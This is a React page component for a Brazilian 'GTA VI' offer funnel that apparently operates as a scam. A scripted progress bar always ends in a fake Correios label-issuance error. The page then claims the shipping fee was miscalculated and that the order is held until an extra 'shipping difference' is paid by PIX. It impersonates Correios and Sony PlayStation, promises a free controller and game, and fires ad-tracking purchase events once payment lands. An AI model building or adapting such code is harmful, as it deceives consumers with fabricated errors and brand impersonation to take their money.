import FunnelButton from "@/components/funnel/FunnelButton";
import { GTA_IMAGES as IMG } from "@/lib/gta-assets";
import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useMemo, useRef, useState } from "react";
import { useServerFn } from "@tanstack/react-start";
import { createPixCharge, getPixStatus } from "@/lib/pix.functions";
import { getOrderSummary } from "@/lib/order.functions";
import { getTikTokAttribution, ttParams, ttTrack } from "@/lib/tiktok";
import { fbParams, fbTrack, getMetaAttribution } from "@/lib/meta";

const brl = (v: number) => v.toFixed(2).replace(".", ",");

const DIFF = {
  pac: { id: "pac", label: "Entrega padrão · PAC", eta: "7 a 12 dias úteis · com rastreio", diff: 12.9 },
  sedex: { id: "sedex", label: "Expresso · SEDEX", eta: "2 a 5 dias úteis · com rastreio", diff: 16.5 },
} as const;

type ShipId = keyof typeof DIFF;
type Stage = "check" | "erro" | "aviso" | "escolha" | "pix";

const CORREIOS = "/copo-quiz/assets/correios-logo.png";

function CorreiosBadge() {
  return (
    <div className="mst-correios">
      <img src={CORREIOS} alt="Correios" width={34} height={34} />
      <span>
        <b>Correios</b>
        <span>Sistema de postagem e etiquetagem</span>
      </span>
    </div>
  );
}

export const Route = createFileRoute("/erro-frete")({
  head: () => ({
    meta: [
      { title: "Diferença de frete · Pedido GTA VI" },
      {
        name: "description",
        content:
          "Falta pagar a diferença do frete do seu pedido GTA VI. Regularize em segundos via PIX e libere o envio com rastreio.",
      },
      { property: "og:title", content: "Diferença de frete · Pedido GTA VI" },
      {
        property: "og:description",
        content: "Pague a diferença do frete por PIX e libere o envio das seu controle + jogo GTA VI.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  validateSearch: (s: Record<string, unknown>) => ({
    order: typeof s["order"] === "string" ? s["order"] : "",
    ship: s["ship"] === "sedex" ? "sedex" : "pac",
  }),
  component: ErroFrete,
});

function ErroFrete() {
  const { order, ship } = Route.useSearch();
  const navigate = useNavigate();
  const buscarPedido = useServerFn(getOrderSummary);
  const criarPix = useServerFn(createPixCharge);
  const consultarPix = useServerFn(getPixStatus);

  const [stage, setStage] = useState<Stage>("check");
  const [prog, setProg] = useState(0);
  const [pedido, setPedido] = useState<Awaited<ReturnType<typeof getOrderSummary>> | null>(null);
  const [escolha, setEscolha] = useState<ShipId>((ship as ShipId) || "pac");
  const [loading, setLoading] = useState(false);
  const [err, setErr] = useState("");
  const [novoPedido, setNovoPedido] = useState("");
  const [pixCode, setPixCode] = useState("");
  const [pixImg, setPixImg] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const pollRef = useRef<number | null>(null);

  const valor = DIFF[escolha].diff;
  const dados = pedido?.ok ? pedido : null;

  const endereco = useMemo(() => {
    const s = dados?.shipping;
    if (!s?.rua) return "";
    return `${s.rua}, ${s.num}${s.compl ? ` - ${s.compl}` : ""} · ${s.bairro} · ${s.cidade}/${s.uf}`;
  }, [dados]);

  useEffect(() => {
    if (!order) return;
    void buscarPedido({ data: { orderId: order } }).then(setPedido).catch(() => setPedido(null));
  }, [order, buscarPedido]);

  useEffect(() => {
    const el = document.querySelector<HTMLElement>(".mst-co");
    if (el) el.scrollTop = 0;
    window.scrollTo({ top: 0, behavior: "auto" });
    const t = window.requestAnimationFrame(() => {
      const e2 = document.querySelector<HTMLElement>(".mst-co");
      if (e2) e2.scrollTop = 0;
      window.scrollTo({ top: 0, behavior: "auto" });
    });
    return () => window.cancelAnimationFrame(t);
  }, [stage]);

  useEffect(() => {
    if (stage !== "check") return;
    setProg(0);
    const i = window.setInterval(() => {
      setProg((p) => {
        if (p >= 100) {
          window.clearInterval(i);
          window.setTimeout(() => setStage("erro"), 350);
          return 100;
        }
        return p + 2.5;
      });
    }, 90);
    return () => window.clearInterval(i);
  }, [stage]);

  useEffect(() => {
    if (stage !== "pix" || !novoPedido) return;
    let alive = true;
    async function check() {
      try {
        const r = await consultarPix({ data: { orderId: novoPedido } });
        if (!alive) return;
        if (r.status === "approved") {
          if (pollRef.current) window.clearInterval(pollRef.current);
          ttTrack("CompletePayment", ttParams(valor, { order_id: novoPedido }), novoPedido);
          fbTrack("Purchase", fbParams(valor, { order_id: novoPedido }), novoPedido);
          void navigate({
            to: "/obrigado",
            search: { order: novoPedido, base: order, ship: escolha },
          });
        }
      } catch {
        /* tenta de novo */
      }
    }
    void check();
    pollRef.current = window.setInterval(check, 5000);
    return () => {
      alive = false;
      if (pollRef.current) window.clearInterval(pollRef.current);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [stage, novoPedido]);

  async function gerarPix() {
    if (!dados) return setErr("Não encontramos os dados do seu pedido.");
    setErr("");
    setLoading(true);
    try {
      const r = await criarPix({
        data: {
          amount: Number(valor.toFixed(2)),
          productName: `Diferença de frete ${escolha.toUpperCase()} - pedido ${order}`,
          items: [{ nome: `Diferença de frete ${escolha.toUpperCase()}`, valor }],
          variant: "frete-diff",
          customer: dados.customer,
          tracking: { ...getTikTokAttribution(""), ...getMetaAttribution() },
          shipping: { ...dados.shipping, method: escolha },
        },
      });
      setLoading(false);
      if (!r.ok) return setErr(r.error);
      setNovoPedido(r.orderId);
      setPixCode(r.qrCode ?? "");
      setPixImg(r.qrCodeBase64 ?? null);
      setStage("pix");
      ttTrack("AddPaymentInfo", ttParams(valor, { description: "Diferença de frete" }), r.orderId);
      fbTrack("AddPaymentInfo", fbParams(valor, { description: "Diferença de frete" }), r.orderId);
      window.scrollTo({ top: 0 });
    } catch {
      setLoading(false);
      setErr("Não foi possível gerar o PIX. Tente novamente em instantes.");
    }
  }

  async function copyPix() {
    try {
      await navigator.clipboard.writeText(pixCode);
      setCopied(true);
      window.setTimeout(() => setCopied(false), 2500);
    } catch {
      setErr("Não foi possível copiar. Toque e segure o código para copiar.");
    }
  }

  return (
    <main className="mst-co" role="main">
      <div className="mst-co-head">
        <span className="mst-co-brand">
          <img src={IMG.logo} alt="Sony PlayStation" />
          <span>GTA VI</span>
        </span>
        <span className="mst-co-secure">Ambiente seguro</span>
      </div>

      <div className="mst-co-body">
        {stage === "check" && (
          <>
            <div className="mst-kicker">Pedido {order ? `#${order}` : "confirmado"}</div>
            <h2 className="mst-h2">
              Gerando a sua
              <br />
              <span className="mst-lime">etiqueta de envio</span>
            </h2>
            <div className="mst-alert">
              <div className="mst-alert-head">
                <span className="mst-alert-title">Processando junto aos Correios</span>
              </div>
              <p>
                Estamos gerando a sua etiqueta. Aguarde e <b>não feche esta página</b> antes de
                confirmarmos o seu envio.
              </p>
              <div className="mst-progress">
                <span style={{ width: `${prog}%` }} />
              </div>
              <CorreiosBadge />
            </div>
          </>
        )}

        {stage === "erro" && (
          <>
            <div className="mst-warn" aria-hidden="true">
              <svg viewBox="0 0 24 24">
                <path d="M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0Z" />
                <line x1="12" y1="9" x2="12" y2="13" />
                <line x1="12" y1="17" x2="12.01" y2="17" />
              </svg>
            </div>
            <div className="mst-kicker" style={{ textAlign: "center" }}>
              Pedido {order ? `#${order}` : ""}
            </div>
            <h2 className="mst-h2" style={{ textAlign: "center" }}>
              Erro ao gerar a
              <br />
              <span className="mst-lime">etiqueta de envio</span>
            </h2>

            <div className="mst-alert">
              <div className="mst-alert-head">
                <span className="mst-alert-title">Falha na emissão da etiqueta</span>
              </div>
              <p>
                O sistema dos Correios não aceitou a etiqueta do seu endereço porque{" "}
                <b>o valor de frete calculado anteriormente está incorreto</b> para a sua região.
              </p>
              <p>
                Para emitir a etiqueta correta e liberar a postagem, é necessário{" "}
                <b>ajustar o valor real do envio</b>.
              </p>
              <CorreiosBadge />
            </div>

            <div className="mst-totals">
              <div className="mst-status-line">
                <span>Pagamento do pedido</span>
                <b className="ok">Aprovado</b>
              </div>
              <div className="mst-status-line">
                <span>Emissão da etiqueta</span>
                <b className="fail">Recusada</b>
              </div>
              <div className="mst-status-line">
                <span>Status do envio</span>
                <b className="fail">Aguardando correção</b>
              </div>
            </div>

            <FunnelButton type="button" className="mst-cta" onClick={() => setStage("aviso")}>
              Verificar frete correto
            </FunnelButton>
          </>
        )}

        {stage === "aviso" && (
          <>
            <div className="mst-kicker">Pedido {order ? `#${order}` : ""}</div>
            <h2 className="mst-h2">
              Ajuste o frete
              <br />
              <span className="mst-lime">para liberação do pedido!</span>
            </h2>
            <p className="mst-sub">
              A verificação junto aos Correios foi concluída. O valor cobrado para o seu CEP é
              maior do que o valor calculado no checkout, e existe uma{" "}
              <b>diferença de frete em aberto</b>. Seu pedido não foi cancelado.
            </p>

            <div className="mst-alert">
              <div className="mst-alert-head">
                <span className="mst-alert-title">Pedido retido para postagem</span>
              </div>
              <p>
                Enquanto a diferença não for paga, a etiqueta não é emitida e o pedido permanece
                retido, sem sair para postagem. Após a confirmação do pagamento, a etiqueta é
                emitida e o envio é feito com <b>código de rastreio</b>.
              </p>
              <CorreiosBadge />
            </div>

            <div className="mst-note-ok">
               <b>Seu controle + jogo continuam grátis.</b> Você paga apenas a diferença do envio, uma única vez.
              Nenhum valor já pago será cobrado novamente.
            </div>


            {endereco && (
              <div className="mst-totals">
                <div className="mst-total-row">
                  <span>Entrega para</span>
                  <b style={{ textAlign: "right" }}>{endereco}</b>
                </div>
              </div>
            )}

            <FunnelButton type="button" className="mst-cta" onClick={() => setStage("escolha")}>
              Ajustar frete para liberar pedido
            </FunnelButton>
          </>
        )}

        {stage === "escolha" && (
          <>
            <div className="mst-kicker">Diferença a pagar</div>
            <h2 className="mst-h2">
              Escolha como quer
              <br />
               <span className="mst-lime">receber seu kit</span>
            </h2>
            <p className="mst-sub">
              Os valores abaixo correspondem apenas à <b>diferença de frete em aberto</b>.
              Selecione a modalidade de envio e pague por PIX para liberar a emissão da etiqueta.
            </p>
            <CorreiosBadge />


            <div className="mst-ship">
              {(Object.keys(DIFF) as ShipId[]).map((id) => (
                <FunnelButton
                  key={id}
                  type="button"
                  className={"mst-ship-row" + (escolha === id ? " is-on" : "")}
                  onClick={() => setEscolha(id)}
                >
                  <span className="mst-radio" />
                  <span>
                    <span className="mst-ship-name">{DIFF[id].label}</span>
                    <span className="mst-ship-eta">{DIFF[id].eta}</span>
                  </span>
                  <span className="mst-ship-price">
                    <span className="mst-diff">falta R$ {brl(DIFF[id].diff)}</span>
                  </span>
                </FunnelButton>
              ))}
            </div>

            <div className="mst-note-ok">
              Após a confirmação, o envio fica programado para depois do lançamento de 19/11/2026, com rastreio por e-mail.
            </div>

            {err && <div className="mst-err">{err}</div>}

            <FunnelButton type="button" className="mst-cta" disabled={loading} onClick={gerarPix}>
              {loading ? "Gerando PIX..." : `Pagar diferença de R$ ${brl(valor)}`}
            </FunnelButton>
          </>
        )}

        {stage === "pix" && (
          <>
            <div className="mst-kicker">Último passo</div>
            <h2 className="mst-h2">
              Pague a diferença
              <br />e <span className="mst-lime">libere o envio</span>
            </h2>

            <div className="mst-totals">
              <div className="mst-total-row">
                <span>Pedido original</span>
                <b>#{order}</b>
              </div>
              <div className="mst-total-row">
                <span>Frete escolhido</span>
                <b>{escolha.toUpperCase()}</b>
              </div>
              <div className="mst-total-final">
                <span>Diferença a pagar</span>
                <b>R$ {brl(valor)}</b>
              </div>
            </div>

            {pixCode && (
              <>
                <FunnelButton type="button" className="mst-cta" onClick={copyPix}>
                  {copied ? "Código copiado!" : "Copiar código PIX"}
                </FunnelButton>
                <div className="mst-pix-code">{pixCode}</div>
              </>
            )}

            {(pixImg || pixCode) && (
              <div className="mst-qr">
                <img
                  src={
                    pixImg ??
                    `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}`
                  }
                  alt="QR Code do PIX da diferença de frete"
                  width={200}
                  height={200}
                />
              </div>
            )}

            <ol className="mst-pix-steps">
              <li>Abra o app do seu banco</li>
              <li>Escolha PIX &gt; Pix Copia e Cola</li>
              <li>Cole o código e confirme o pagamento</li>
            </ol>

            {err && <div className="mst-err">{err}</div>}
            <div className="mst-watch">
              Aguardando o pagamento — assim que cair, seu pedido é liberado automaticamente
            </div>
          </>
        )}

        <p className="mst-company">
          <strong>Oferta GTA VI</strong>
          Confira o valor antes de pagar.
        </p>
      </div>
    </main>
  );
}
